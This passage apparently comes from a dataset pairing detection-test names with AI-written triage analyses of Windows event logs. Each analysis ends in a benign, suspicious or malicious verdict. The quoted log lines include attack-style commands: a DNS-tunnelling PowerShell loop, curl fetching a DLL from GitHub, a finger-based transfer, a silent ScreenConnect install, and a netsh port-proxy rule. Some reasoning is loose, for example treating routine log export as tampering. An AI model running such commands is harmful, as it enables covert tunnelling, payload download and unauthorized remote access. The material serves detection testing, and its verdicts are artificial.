   - Thoroughly analyze network logs to trace any unexpected outbound connections, especially to `www.example.com`.
   - Review user activity, especially actions by `SERVER002\\admin_test`, whose context and activities need to be verified.
   - Conduct a forensic analysis of the system to trace any persistence mechanisms or additional compromise vectors.

3. **Future Prevention:**
   - Implement stricter controls and monitoring for file transfer processes.
   - Regularly review and audit system configurations and logs for unauthorized access or anomalous changes.
   - Ensure all software, especially update mechanisms, are secured and verified to prevent exploitation.

By following these steps, you can mitigate the risk and impact of this compromise and better secure the system against similar threats."
Splashtop Streamer Execution,"### Detailed Analysis:

#### Suspicious or Anomalous Behavior:
1. **Frequent Execution of Built-in Tools:**
   - Multiple entries indicate the execution of built-in Windows utilities like `powershell.exe`, `wevtutil.exe`, and `whoami.exe`.
   - Execution of `powershell.exe` with the command line indicating the launch of ""Splashtop Remote"" (`Splashtop\\Splashtop Remote\\Server\\SRServer.exe`). This software is typically used for remote desktop access which may not necessarily be benign depending on the context.

2. **Event Log Export:**
   - The `wevtutil.exe` command is used to export event logs: `""wevtutil.exe epl Microsoft-Windows-Sysmon/Operational C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\TempLog.evtx""`.
   - Exporting event logs may indicate an attempt to investigate system activity or cover tracks, potentially malicious if done unexpectedly.

3. **High Integrity Level:**
   - Several processes (e.g., `powershell.exe`, `wevtutil.exe`) are executed at a 'High' integrity level, showing they may have admin privileges.

#### Indicators of Potential Malicious Activity:
- **PowerShell Commands:**
  - Using PowerShell to start processes (`Start-Process`) can be benign but is a common method used in attacks.
  - Command line suggests administrative level access was used to manipulate or start applications, possibly without user consent.

- **Remote Access Software:**
  - `Splashtop Remote` is legitimate software, but its unauthorized use for remote access remains a security concern.
  - Scenarios like lateral movement or unauthorized access through remote desktop software highlight potential threats.

#### Threat/Risk Assessment:
- The use of PowerShell with specific command lines to manage remote desktop software combined with event log exports poses a potential risk.
- If the 'SERVER002\admin_test' user did not sanction this activity, it could indicate unauthorized access or privilege misuse.

#### Guidance for Further Action:
1. **User Verification:**
   - Confirm with the user ('admin_test') whether they executed the observed actions intentionally. Unauthorized actions should trigger further investigation.
   
2. **Audit Remote Access:**
   - Examine the configuration and logs of the `Splashtop Remote` software to ensure it is not being exploited for unauthorized access.

3. **Review Security Policies:**
   - Consider restricting the use of powerful scripts and tools to only verified and monitored activities.

4. **Advanced Forensic Investigation:**
   - If actions remain unexplained or unauthorized, further forensic analysis to uncover any additional traces of unauthorized access is recommended.

### Conclusion:

Based on the detailed analysis, the activities appear to be **SUSPICIOUS** due to the potentially unauthorized use of PowerShell with admin rights to start remote desktop processes and export event logs. Further investigation is necessary to determine if this behavior is truly malicious or can be explained by legitimate user activity."
DNS Large Query Volume,"Based on the provided Windows event logs, I have conducted an analysis and noted several points of interest:

1. **Unusual PowerShell Activity:**
   - The logs show the execution of a PowerShell command with the following details:
     ```
     CommandLine: powershell.exe & {for($i=0; $i -le 1000; $i++) { Resolve-DnsName -type ""TXT"" ""file-$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.nip.io"" -QuickTimeout}}
     ```
   - This PowerShell script seems to be performing a high number of DNS queries for TXT records using dynamically generated subdomain names. This behavior is highly suspicious as it resembles a DNS tunneling activity often used for data exfiltration or command-and-control communications in cyber attacks.

2. **Process Creation and Execution Patterns:**
   - Multiple instances of `conhost.exe`, `wevtutil.exe`, and `powershell.exe` were spawned in a quick succession (milliseconds apart) by the user `SERVER002\admin_test`. 
   - While `conhost.exe` and `wevtutil.exe` are legitimate Windows processes, rapid and repeated execution without clear context is often indicative of automated script activity, potentially malicious if not expected in the environment.

3. **Privilege Escalations:**
   - Several security events indicate the use of high-privilege tokens by the user `admin_test` (event IDs 4672), which can be normal for an admin user, but coupled with other suspicious activities, it necessitates further review.

4. **Frequent Microsoft Edge Update Activity:**
   - There are many logs related to Microsoft's Edge Update processes. While typical in the context of system or browser updating, the volume and timing (in concert with the suspicious PowerShell activity) merit validation with legitimate update scheduling to rule out channel hijacking.

5. **Time Discrepancies:**
   - There are logs that reference time adjustments (Event ID 4616), which could be routine, but such adjustments can also be used to obscure malicious activities in logs.

### Assessment:

From the above observations:
- **The PowerShell script execution is the most concerning activity**. It stands out as indicative of potentially malicious behavior aiming at DNS-based data leakage or covert communications.
- **Multiple rapid process executions** warrant review, especially given the pattern of log entries, though they could also be a result of legitimate administrative scripts.
- **Privilege escalation log entries** are normal for an administrative session but should be verified in the context of all activities during the session.

### Resolution: SUSPICIOUS

The logs contain behaviors and patterns that are atypical and demonstrate potential malicious intent, but additional context (such as confirmation of expected administrative activities, scheduled updates, etc.) is necessary to validate these concerns. 

### Recommendation:

- Conduct a detailed review of the specifics around the `SERVER002\admin_test` activities.
- Evaluate the legitimacy of the PowerShell execution, ensuring it aligns with expected tasks.
- Cross-reference the timing of Microsoft Edge updates with organizational policies or known schedules.
- Monitor and audit for any repeated patterns or escalations. If uncertainties remain or are corroborated by more evidence, consider further investigation or a forensic review."
LogMeIn Files Detected Test on Windows,"Upon analyzing the provided log entries, there are several observations that can be made about potential suspicious activity on the Windows machine identified as ""Server002"". Here's a breakdown of the key findings:

1. **Security Logs**:
   - The `4616` events indicate time changes by the LOCAL SERVICE account, but these are not unusual by themselves as they might result from regular system processes or time synchronization.
   - An `4672` event shows the account `admin_test` being assigned a wide range of high privileges, which includes `SeDebugPrivilege` and others. These privileges are sensitive, and such events should be further investigated to confirm need and legitimacy.
   - The event `4624` shows a successful logon for user `admin_test` using NTLM authentication without showing any apparent reasons for concern from these logs alone.

2. **PowerShell Logs**:
   - There are multiple entries indicating PowerShell execution. Particularly noteworthy is the script execution that downloads `LogMeInIgnition.msi` and installs it silently. This could be flagged as suspicious as it demonstrates the use of PowerShell to download and execute potentially unwanted or malicious software.
   - Although LogMeIn is a legitimate remote access application, its deployment in this manner could indicate unauthorized remote access installation.

3. **System and Application Logs**:
   - The logs show the installation and service control events related to the applications, including LogMeIn, as indicated by `MsiInstaller` events. This corroborates the PowerShell activity.
   - `WebClient` service configuration change from demand start to auto-start is noted, which might suggest persistence mechanisms being set up.

4. **Sysmon Logs**:
   - Frequent use of `wevtutil.exe` and `conhost.exe` by user `admin_test` could be indicative of potential log manipulation or command-line activities.
   - The detailed log entries capture the execution of `LogMeIn Ignition` and its services, triggered via a PowerShell script, possibly as means to gain remote access.
   - There are multiple processes related to Microsoft Edge Update running, which looks like typical application maintenance, yet due to context could warrant a closer look.

### Assessment and Resolution:

The PowerShell usage indicates the download and execution of a remote access tool (`LogMeInIgnition.msi`), which might be installed without direct user consent or proper authorization. The manner of installation (silent) alongside privilege escalation is often indicative of attempts to surreptitiously maintain access or deploy unauthorized software.

**Resolution**: **SUSPICIOUS**

Further investigation is required to determine the legitimacy of the `admin_test` activities and the explicit need for the deployment of LogMeIn. Common next steps:
- **Verify with system administrators and the user** `admin_test` if this installation was sanctioned.
- **Review network logs** to see if there are unauthorized remote connections being initiated.
- **Examine changes in the security settings**, especially related to account privileges and service configurations.
- **Conduct a threat hunting activity** to check if similar two-stage executions and escalations occur repetitively across your network. 

The investigation should focus on verifying any unsanctioned access attempts and preventing any potential lateral movement or unauthorized remote management setups."
Splashtop Execution,"After thoroughly analyzing the provided Windows event logs, here are the key observations and findings:

1. **Installation Activity:** There are multiple references to the installation and setup of applications such as Splashtop Personal and Microsoft Edge. The `MsiInstaller` events show the installation of Splashtop Personal which is a legitimate remote desktop software, and `Microsoft-Windows-Sysmon` logs indicate multiple instances of Microsoft Edge setup being executed. The use of `msiexec.exe` in the logs fits with normal installation procedures for Windows Installer packages.

2. **Temporary Directory Executables:** Many processes are executed from temporary directories, including `InstallShield` setup engines (_is8B2A.exe) and `Splashtop` remote client setup (splashtop_install.exe). While code execution from temp directories can be suspicious, the noted logs show activities associated with software installation and setup routines, which coincide with the installation logs.

3. **PowerShell Activity:** There is a PowerShell command executed to start the Splashtop Remote Client (strwinclt.exe) which aligns with the installation of the Splashtop software. While PowerShell can be used for malicious purposes, in this case, it seems related to the installation process.

4. **Process Execution:** The `Sysmon` logs detail various process executions consistent with software installations (e.g., `conhost.exe`, `cmd.exe` as part of setup utilities). These match with the activities of software installation.

5. **Security Events:** There is a Security Event (Event ID 4799) associated with Microsoft Edge Setup. This aligns with the installation and allows it to run within the bounds of expected behavior for a system with Microsoft software, given it is executed by `NT AUTHORITY\SYSTEM`.

6. **Certificate Verification:** The `CAPI2` logs show checks against certificate authorities (Go Daddy and Starfield). This suggests that security certificates are being validated during software installation, which is standard for verifying software authenticity.

**Summary:**
The observed behaviors are consistent with legitimate software installation and setup activities, specifically related to Splashtop Personal and Microsoft Edge. There is no clear indication of privilege escalation or arbitrary code execution outside expected parameters of a software setup process. The logs do show that temporary directories are used for setup processes, which is normal for temporary extraction during installations.

**Resolution:** **BENIGN**

The logs contain benign activity consistent with the software installation documented in the event logs. No direct indicators of compromise or malicious activity have been identified. No further investigation appears necessary unless additional logs or context suggests otherwise."
DNS Regular Beaconing,"Upon analyzing the provided log entries, I have identified several indicators of potentially malicious activity within the logs:

### Windows PowerShell Logs
- There is a PowerShell command execution involving a script `data-dns-beacon.ps1` from a temporary location: `C:\Users\ADMIN_~1\AppData\Local\Temp\file`. The script utilizes parameters such as `-Domain 127.0.0.1.nip.io`, `-Subdomain`, `-QueryType TXT`, `-C2Interval 30`, `-C2Jitter 20`, and `-RunTime 30`. This implies the usage of a DNS beaconing technique often seen in Command and Control (C2) communication from malware trying to silently communicate with a C2 server.

### Sysmon Logs
- **Whoami.exe** and **hostname.exe** commands execution from high integrity levels, combined with their hosting by `wsmprovhost.exe`, suggests remotely executed commands through Windows Management Instrumentation (WMI). This aligns with common lateral movement or reconnaissance behavior.
- Repeated executions of `wevtutil.exe`, a command used to retrieve event logs can indicate attempts to hide tracks by clearing logs or reviewing system activities stealthily.

### Security and System Logs
- The time was altered on the system from `2024-10-23 15:41:45.2958999` to `2024-10-23 15:41:43.1373410`. Time manipulation is often used to mask malicious activities or alter timestamps of log files, making tracking more difficult.

### Assessment
- **PowerShell Activity**: The execution of the `data-dns-beacon.ps1` script with parameters indicating DNS-based C2 communication is highly suspicious and a strong indicator of C2 activity.
- **Sysmon Activity**: The variety of command executions—particularly the repeated use of `wevtutil.exe` and the orchestration through processes with high integrity—points towards potential malign manipulation or suppression of evidential artifacts.
- **Time Manipulation**: The adjustment of system time usually indicates an attempt to cover tracks or bypass time-based security measures.

Given these observations, the overall assessment leans towards potential malicious activity.

### Recommendation
- Isolate the affected system (Server002) from the network to prevent further potential C2 communication.
- Perform an in-depth forensic analysis, inspecting the files and network traffic for any signs of data exfiltration or additional malware presence.
- Review security patches and hardening measures are up to date, particularly in securing PowerShell use and WMI.
- Monitor for anomalies across your environment that may suggest propagation beyond this isolated incident.
  
**Resolution**: MALICIOUS

This conclusion is based on the presence and execution of a script with signs of C2 communication, suspicious command executions, potential log file tampering indications, and time manipulation detected in the logs."
Curl Download File,"### Analysis:

Upon reviewing the Windows event logs provided, the following observations have been made, which are considered suspicious:

1. **Time Change Event in Security Logs:**
   - Several entries indicate changes in the system time, as evidenced by Event ID 4616 in the security logs. The time was changed from ""2024-10-24 11:48:43.0827083"" to ""2024-10-24 11:48:38.7510578"". This could be the result of a benign activity, such as synchronization with an NTP server, but it can also be indicative of an attempt to confuse event logs during malicious activities.

2. **Process Execution Details in Sysmon Logs:**
   - A series of processes were executed by the user ""SERVER002\admin_test"" using PowerShell, Conhost, and wevtutil.exe which may be indicative of scripting or instance manipulation. The execution of ""wevtutil.exe"" multiple times can be suspicious, as it is often used to query or manipulate Windows Event Logs.
   - Of most importance is the observed execution of ""cmd.exe"" with a command line that downloads a DLL file (""AllTheThingsx64.dll"") using Curl from a GitHub repository. This activity is highly suspicious and suggests the possibility of downloading a malicious payload onto the system:
     - `Cmd.exe /c C:\Windows\System32\Curl.exe ... -o c:\users\public\music\allthethingsx64.dll ...`
     - This command suggests downloading and storing potentially malicious DLLs in multiple locations such as the user's public music directory, program data, and a temporary directory.
   
3. **Multiple Abnormal ""curl.exe"" Executions:**
   - Multiple instances of ""curl.exe"" were executed, downloading the same suspicious file from the internet. The presence of repeated download attempts raises concerns regarding the persistence and automatic execution of malicious payloads.

4. **Network Activity:**
   - The ""Microsoft-Windows-Time-Service"" log indicates a synchronization with ""time.windows.com,"" which may be benign if part of routine time synchronization, yet should be cross-verified with company policies.

### Conclusion:

The execution of ""curl.exe"" to download DLL files, especially from an online source like GitHub, along with the odd sequence of PowerShell and event utility executions, are strong indicators of malicious activity. The use of normal binaries for potentially unauthorized actions (e.g., time tampering, file downloads) could suggest a sophisticated attempt at maintaining a low profile while compromising the system.

### Resolution: MALICIOUS

Based on the analysis of the logs, a conclusion is drawn that the activities observed are **malicious**. Immediate steps should include:
- Conducting a forensic investigation on ""SERVER002"" to detect any unauthorized installed programs or DLLs.
- Containment measures to disconnect the host from the network.
- Alerting IT security and management teams.
- Reviewing access logs and network traffic for additional signs of intrusion.
- Implementing measures to prevent further download and execution of untrusted software on corporate devices.

"
Nimgrab - Transfer Files,"### Detailed Analysis:

1. **PowerShell Execution (EventID 5):**
   - The presence of `powershell.exe` execution is visible in the logs. While PowerShell is a legitimate Windows tool, it is also frequently used by attackers for malicious purposes. However, without specific command-line arguments or context showing harmful intent, this alone cannot be deemed malicious.

2. **Frequent Use of `wevtutil.exe` (EventID 5):**
   - The use of `wevtutil.exe`, a command-line utility for event log management, is noticeable multiple times by the user `SERVER002\admin_test`. While it is a legitimate utility, its unusual or excessive usage might indicate log tampering or evasion techniques. This behavior is indeed suspicious and warrants further investigation to ensure it's not being used to clean logs or cover malicious activity.

3. **Multiple `cmd.exe` Instances with Complex Command-Line (EventID 1, 5):**
   - `cmd.exe` is executed with a command-line argument that attempts to execute a script from a URL (“https://raw.githubusercontent.com.../LICENSE.txt”) using another tool `nimgrab.exe`. This is extremely suspicious as it attempts to download and possibly execute scripts from the web, which could be indicative of a download-and-execute attack typically seen in malware or command-and-control scenarios.

4. **Presence of `nimgrab.exe`:**
   - This further supports the possibility of malicious activity as `.exe` files being downloaded from the web and executed without prior notice of legitimate usage are a common characteristic of malware deployment stages.
   
5. **Overall User Behavior (admin_test):**
   - The activity performed by `admin_test`, who exhibits high-integrity level tasks, combined with attempts to manipulate event logs and installations from external sources, indicates potential misuse of admin privileges.

### Conclusion:

Based on the analysis of the logs, there are multiple indicators of potential malicious behavior:

- **Suspicious use of `cmd.exe`** to download and execute a script from an external source indicates potential malware activity.
- **Unusual usage pattern of `wevtutil.exe`** possibly suggests log manipulation attempts.

The combination of these actions under a high-integrity user context without justification strongly implies an attempt to evade detection and deploy malicious software or scripts. These patterns are typically associated with malicious activity or preparation for malicious acts.

### Assessment: MALICIOUS

### Recommendations for Further Actions:

1. **Immediate Isolation and Investigation:**
   - Isolate the affected machine from the network to prevent any further potential compromise or lateral movement across the network.

2. **Perform a Full Malware Scan:**
   - Use trusted malware scanning tools to check for and eliminate any malware or unauthorized software.

3. **Comprehensive Log Review:**
   - Conduct a thorough review of the event logs across the network to identify if similar activities have been observed elsewhere, indicating wider spread compromise.

4. **User Activity Review:**
   - Check the recent activity of the `admin_test` user to ensure there is no further unauthorized access or use of elevated privileges.

5. **Strengthen Security Measures:**
   - Consider implementing stricter PowerShell execution policies, tightening network egress controls to prevent outbound traffic to potentially harmful sites, and revising admin access policies.

By taking these steps, the organization can contain the incident and mitigate further risks while ensuring a more secure environment."
File download with finger.exe on Windows,"Upon reviewing the log entries provided, I have identified the following areas and activities that require attention:

### Security Log Analysis:
- **Event 4634:** A logoff event for the user `admin_test` from the system `SERVER002`. This indicates user activity but is not inherently malicious.
- **Event 4672 (Multiple Instances):** Indicates special privileges assigned to `admin_test`. These privileges include `SeDebugPrivilege` and `SeLoadDriverPrivilege`, which could be leveraged for malicious purposes if used improperly, but on their own are not a definitive indicator of malicious activity.
- **Event 4624 (Multiple Instances):** A successful logon event using NTLM authentication from workstation `DESKTOP-3HL5B2P`, using the user `admin_test`. This shows activity from a specific workstation. The logon type `3` indicates network logon, typically used in scenarios like accessing shared resources, which again is not inherently malicious.

### System Log Analysis:
- The system logs involve various Kernel and Time service logs without any conspicuous activities directly aligning with malicious behavior. The adjustment of system time could raise a flag but without more context, it doesn’t immediately imply a compromise.

### Sysmon Log Analysis:
- **Events involving `wevtutil.exe` and `conhost.exe`:** These processes are legitimate system processes but need special attention if seen in high abundance or if involving suspicious parameters. The instances seem procedurally correct without exploitative use.
- **Event 1 with `cmd.exe` CommandLine: `""cmd.exe"" /c finger base64_filedata@localhost`:** This entry is noteworthy. The use of the `finger` command, coupled with what appears to be a base64 string, could potentially be related to data exfiltration or other suspicious behavior. This command could indicate attempts to retrieve or send illicit data but would warrant further investigation to confirm context and intent.

### Application Log Analysis:
- The application logs show standard stop entries for Windows services related to updates. These entries do not display immediate signs of a threat.

### Overall Assessment:
From the data, while there are no definitive indicators of compromise or malicious activity, the usage of specific commands and privilege escalation events does warrant further investigation. The most suspicious indicator is the execution of a `cmd.exe` command with `finger` and what seems to be an encoded payload, which could indicate an improper or unauthorized action.

### Resolution:
- **SUSPICIOUS**: The logs contain activity that doesn't look right and needs more investigation, particularly regarding the `finger` command usage and the assignment of sensitive privileges to the `admin_test` account which could be leveraged for malicious purposes. Further investigation is required, such as:
  - Exploring the intent and origin of the `finger` command.
  - Reviewing network traffic logs for any outbound connections corresponding to the suspicious `cmd.exe` command.
  - Conducting a security review of user `admin_test`, particularly the source workstation `DESKTOP-3HL5B2P`, for any unauthorized access patterns or configurations."
Steganographic Tarball Embedding,"Upon analyzing the provided Windows event logs for suspicious or malicious activity, the following findings are noted:

1. **Microsoft Edge Installer Activity**:
   - The logs contain a series of events related to the execution of ""setup.exe"" from the directory of Microsoft Edge's installation path. This includes processes with command-line arguments pointing to tasks such as ""--msedge"", ""--system-level"", and various update-related actions. 
   - This activity is consistent with legitimate software update processes for Microsoft Edge and occurs under the ""NT AUTHORITY\SYSTEM"" user, which is expected for system-level updates through the official Microsoft updater.
   
2. **Repeated PowerShell and Conhost Executions**:
   - There are several instances where ""powershell.exe"" is executed by the user ""SERVER002\admin_test"". Specifically, an event shows the use of PowerShell to process files and create a new file using specific paths and encoding options.
   - Additionally, there are numerous instances of ""conhost.exe"" being launched, which often accompany terminal sessions or commands.

3. **Unusual Use of PowerShell**:
   - The PowerShell command involves reading content from specified file paths and writing output to another file. The use of the JPEG file extension combined with terms like ""tarz"" might suggest attempts at encoding, decoding, or transferring atypical data formats.
   - While PowerShell is widely used for both administrative and automated scripting tasks in Windows environments, the specific command captured in the logs lacks transparency of purpose and context, suggesting potential misuse.

4. **Use of System Utilities**:
   - The execution of ""wevtutil.exe"" and ""whoami.exe"", in conjunction with PowerShell, raises potential flags. These tools, combined with PowerShell, can be used in attacks where an attacker aims to export event logs (for reconnaissance or exfiltration) or gather user/system information after gaining unauthorized access.

**Assessment**:
The activities captured in the logs appear to show benign activities related to Microsoft Edge updates running under system authority. However, there is suspicious PowerShell activity involving file manipulations with possible attempts at encoding or decoding data which, without clear context, could suggest attempts to obfuscate or execute unauthorized actions.

**Resolution**: **SUSPICIOUS**

- **Guidance on How to Proceed**:
   - Conduct a deeper investigation to determine the nature of the PowerShell script execution, verifying whether it aligns with known administrative tasks or scripts.
   - Review any recent changes or activities performed by the user ""admin_test"" to ascertain if these are sanctioned.
   - Examine the network for unusual traffic or data transfers that might correlate with the timestamps of these events.
   - Consider implementing tighter monitoring of PowerShell execution and conhost processes for this machine, as well as user activity audits to prevent and detect possible misuse.

Overall, while certain activities are characteristic of expected administrative behavior, the presence of potentially obfuscated actions through PowerShell necessitates further scrutiny to conclusively determine intent and legitimacy."
MAZE Propagation Script,"Upon reviewing the provided Windows event logs, I have identified several key observations that point towards potentially malicious activity.

### Noteworthy Observations:

1. **PowerShell Execution and Behavior**:
    - A process involving PowerShell (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) was executed by the user `SERVER002\admin_test`.
    - This PowerShell command involves operations that copy a file (`data.exe`) to remote machines and attempts to execute it using `regsvr32.exe`, a known living-off-the-land binary (LOLBin) often abused for executing scripts on Windows. The command checks connectivity for multiple machines and logs results to external files (`dataMachineList.txt`, `dataOfflineHosts.txt`, `dataCompletedHosts.txt`) located in a user temp directory, suggestive of targeted remote execution or deployment.
    - The use of multiple text files suggests automation and potential lateral movement across the network.

2. **Command Line Arguments**:
   - The PowerShell script contains command-line execution with sequences that may execute external payloads remotely, indicating a potential for credential theft or network reconnaissance.
   - The use of `wmic` to create processes remotely could signify attempts to gain further access throughout the network.

3. **Atypical Process Usage**:
   - A mix of system processes (`wevtutil.exe`, `conhost.exe`) being triggered multiple times often indicate process chain involvement in a particular script or malicious activity.
   - Processes associated with hosting services (`wsmprovhost.exe`) in conjunction with PowerShell commands can be a vector for malicious scripts or commands being run remotely or locally with elevated permissions.

4. **High-Integrity Process Execution**:
   - Most of the activities are being carried out with high integrity levels, indicating that they are running with elevated privileges that can potentially compromise the system.

### Assessment:

Based on the above analysis, the logs show a workflow consistent with actions typically associated with malicious penetration techniques—specifically, attempts to propagate or execute payloads across the network using PowerShell and remote execution techniques. There is a strong indication of lateral movement and potentially unauthorized software deployment in progress.

### Recommended Resolution: **MALICIOUS**

**Actions to Proceed**:
- Immediately isolate the affected machine (Server002) from the network to prevent further spread.
- Conduct a thorough investigation of the trails left on the machine to identify any malware or unauthorized scripts deployed.
- Review and audit logs of other systems for similar activities, focusing on remote execution logs, PowerShell usage, and any anomalies in service creation.
- Update antivirus and endpoint detection tools and perform full scans on the network.
- Review user access and authorization policies to prevent misuse and reduce privilege levels where possible.
- Consider reimaging the affected system if compromise is confirmed."
Arbitrary file download using the Notepad++ GUP.exe binary,"**Detailed Analysis:**

Upon reviewing the provided Sysmon log entries, a pattern of activity emerges that warrants further investigation. Below, I outline key observations and possible concerns:

1. **Microsoft Edge Update Processes:**
   - Multiple instances of Microsoft Edge Update processes are observed in the logs, which is standard for software updates. Several processes execute under `NT AUTHORITY\SYSTEM`, which indicates they are running with high privileges, typical for system update procedures.
   - The processes include installations and execution of `MicrosoftEdgeUpdateSetup.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`, and related components, which appear to be legitimate updates from Microsoft.

2. **PowerShell Execution:**
   - A PowerShell process was started by the user `SERVER002\admin_test`. However, the absence of command-line input doesn't definitively indicate malicious activity, but it is worth noting as PowerShell is commonly used in various attack techniques.

3. **Wevtutil and Conhost Activity:**
   - Frequent execution of `wevtutil.exe` and `conhost.exe` was observed, initiated by `SERVER002\admin_test`. `Wevtutil` is a command-line utility for Windows Event Logs, and its frequent use could be related to event log management or potentially nefarious actions such as log tampering.
   - `Conhost.exe` is typically linked to command-line tasks. This could be legitimate administration activity, but the prevalence of these processes in a short timeframe is unusual. 

4. **Suspicious Command-line Usage:**
   - A notable command was executed with `cmd.exe`, running a sequence of directory operations and launching `GUP.exe` with an external download URL: `https://getsamplefiles.com/download/zip/sample-2.zip.` Such activities can indicate an attempt to download and execute potentially harmful software.
   - The execution of `GUP.exe` (an update utility) with a URL download is highly unusual and suspicious outside the context of known, legitimate updates.

5. **High Integrity Level of Processes:**
   - Many processes run with `High` integrity, indicating elevated privileges. This is consistent with system administrative tasks but can also be leveraged for attacks if the attacker has obtained sufficient privileges.

6. **Absence in Other Logs:**
   - The absence of entries in the PowerShell and Security logs limits our capability to confirm additional actions or verify the intents behind observed activities conclusively.

**Assessment:**
The presence of a command that downloads and extracts a file from a third-party URL, combined with frequent use of utilities such as `wevtutil` and `PowerShell` by a non-default user account (`admin_test`), raises a significant red flag. These activities, without a clear legitimate context, can indicate potential malicious behavior such as unauthorized software installation or data exfiltration attempts.

**Resolution:**

- **SUSPICIOUS:** The combination of behaviors including external file download and execution via `cmd.exe`, alongside unusual utility usage, represents potentially harmful activity needing further exploration. Immediate investigation should be focused on:
  - Verifying the legitimacy of the downloaded content and the intent of `GUP.exe`.
  - Auditing the user account `admin_test` for any unauthorized access or changes.
  - Monitoring and, if necessary, restricting external network traffic and command-line script executions until full risk assessment.

Based on this analysis, additional investigation is recommended to ensure the system's integrity and verify these activities are within operational norms."
ScreenConnect Application Download and Install on Windows,"Upon reviewing the provided event logs from the Windows host, the following observations and analyses have been made:

### Key Observations:

1. **ScreenConnect MSI Installation:**
   - Several logs indicate the installation of an MSI file `ScreenConnect.msi` under the user `admin_test` on `Server002`.
   - The MSI is being downloaded from a URL hosted on Amazon CloudFront (`https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi`) then installed using `msiexec` with the `/qn` flag, indicating a silent installation without user interaction. This is initiated via a PowerShell script.

2. **PowerShell Use:**
   - A PowerShell command is involved in downloading and executing the MSI installation. The command shows the use of `Invoke-WebRequest` to download the MSI file.
   - PowerShell execution appears to be run under high integrity, suggesting it has significant privileges.

3. **Process Executions:**
   - Frequent execution of system utilities like `wevtutil.exe`, `conhost.exe`, and `whoami.exe` by the user `admin_test`.
   - Execution of `whoami.exe` doesn't necessarily indicate maliciousness, but its frequent execution might warrant review to determine if it’s part of routine or scripted tasks.
   
4. **EdgeUpdate:**
   - Logs of `MicrosoftEdgeUpdate.exe` execution and service stop are seen. These activities may be benign, related to routine updates, but warrant checking if associated updates are legitimate.
   
5. **Other System Processes:**
   - System processes such as `svchost.exe`, `sppsvc.exe`, `WmiPrvSE.exe`, `TiWorker.exe`, and `TrustedInstaller.exe` are present in logs, predominantly executed with SYSTEM level privileges, indicating potential regular system operations.

### Analysis:

- **ScreenConnect Installation:**
  - ScreenConnect is a legitimate remote desktop software often used for remote support. However, its installation without explicit user knowledge or legitimate administrative task can be suspicious, especially when downloaded and executed without prompt using PowerShell.
  
- **PowerShell Activity:**
  - The use of PowerShell scripts to download files from external URLs and execute installers, especially in a silent mode, is often seen in malicious activities. It should be verified whether this installation is authorized.

- **General Use of System Tools:**
  - The combination of tools like `wevtutil.exe` and `whoami.exe` along with PowerShell could be indicative of attempts to enumerate and alter system configurations or explore system info, common in post-exploitation activities.

### Conclusion:

Based on this detailed review, the following resolution is recommended:

- **SUSPICIOUS:** While some activities appear legitimate, such as the presence of some system processes and regular tool execution, the method of downloading and installing a potentially powerful remote tool via PowerShell without user interaction raises significant concerns. Further investigation is necessary to determine legitimacy, including confirming the administrative approval of ScreenConnect installation and ensuring that no unauthorized access or configuration change is occurring on the host. Continuous monitoring of similar activities and corroborating with user intent can clarify the situation."
Lolbas replace.exe use to copy file,"After reviewing the provided Sysmon logs, here is the analysis:

1. **Anomalous Process Execution**:
   - The logs show multiple instances of `powershell.exe`, `cmd.exe`, `wevtutil.exe` (Windows event utility), and `conhost.exe` being executed by the user `SERVER002\admin_test`. 
   - The appearance of `wevtutil.exe` multiple times in a short span of time may suggest potential log manipulation. This is often a tactic used in evasive malware to clear logs or hide traces.
   - `cmd.exe` executes a command that involves deleting a temporary file and using `replace.exe`, which might suggest an attempt to alter or replace files on the system. This behavior can indicate a potential malicious activity, especially if it's unexpected behavior for the `admin_test` user.
   - The sequence and rapid execution of these processes could indicate automation or script execution, which might be benign or malicious depending on the context.

2. **Tool Usage**:
   - Use of `whoami.exe` and `hostname.exe` might be part of a legitimate script, but could also be used by an attacker to gather information about the compromised system.

3. **Edge Update Sequence**:
   - The execution of `MicrosoftEdge_X64` and `setup.exe` appears to be associated with an update process for Microsoft Edge. These processes are executed by `NT AUTHORITY\SYSTEM`, which is expected for system-level updates. This activity appears benign as it looks like a standard update operation.

**Conclusion**:
- The execution of common Windows utilities in rapid succession along with file manipulation activities (such as the use of `cmd.exe` and `replace.exe`) without additional context can be suspicious. However, without explicit indicators of compromise (such as connections to known malicious domains or unauthorized privilege escalation), it cannot be definitively marked as malicious.
- The Edge update process appears legitimate.

**Resolution**:
Given the context provided and without additional indicators of compromise, the overall activity observed in the logs is marked as **SUSPICIOUS**. Further investigation is recommended to:
- Ascertain the legitimacy of the process executions under `SERVER002\admin_test`.
- Verify recent actions taken by the `admin_test` account.
- Check for any other logs or indicators that can corroborate whether the operations are part of legitimate administrative activity or unauthorized use or script execution.

**Guidance**:
- Review any scheduled tasks or scripts that may align with the events in the Sysmon logs.
- Look for similar patterns or activities in corresponding security, system, and application logs, if available.
- Monitor the system for any further anomalous behavior and conduct a network analysis to determine if there is any suspicious outbound traffic."
portproxy reg key,"### Detailed Analysis of the Logs

#### 1. **Windows PowerShell Log Analysis**

The PowerShell logs indicate the execution of the command:

```powershell
powershell.exe & {netsh interface portproxy add v4tov4 listenport=1337 connectport=1337 connectaddress=127.0.0.1}
```

This specific command is configuring a port proxy on the system. The use of portproxy could be legitimate for a system administrator setting up port forwarding for remote management purposes. However, given that it is listening on port 1337 (often used by attackers due to its familiarity with the hacker lexicon ‘leet’ - 1337), it is also indicative of potentially malicious intent, especially if the action is not documented or authorized by IT policies.

#### 2. **Sysmon Log Analysis**

- The frequent execution of native Windows utilities (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `netsh.exe`) by the user `SERVER002\admin_test` is observed in a very short timeframe. The use of `wevtutil.exe` and `whoami.exe` could be indicative of reconnaissance activities to learn about event logs and user information.

- The command line associated with `powershell.exe` and `netsh.exe` aligns with the PowerShell logs:
  ```shell
  netsh.exe interface portproxy add v4tov4 listenport=1337 connectport=1337 connectaddress=127.0.0.1
  ```
  
  Repeated mentions of `netsh.exe` facilitate potentially malicious network configuration changes.

#### 3. **Application Log Analysis**

The application log shows the Software Protection Platform Service starting, which is a normal system activity and doesn't indicate malicious behavior in itself.

#### 4. **Security and System Logs**

No notable activity was recorded in the security and system logs for this timeframe, leaving no additional information about user authentication or system errors.

### Assessment

Based on the logs:

- The PowerShell command to set up a port proxy is unusual for normal user activity unless explicitly allowed and documented by IT policies.
  
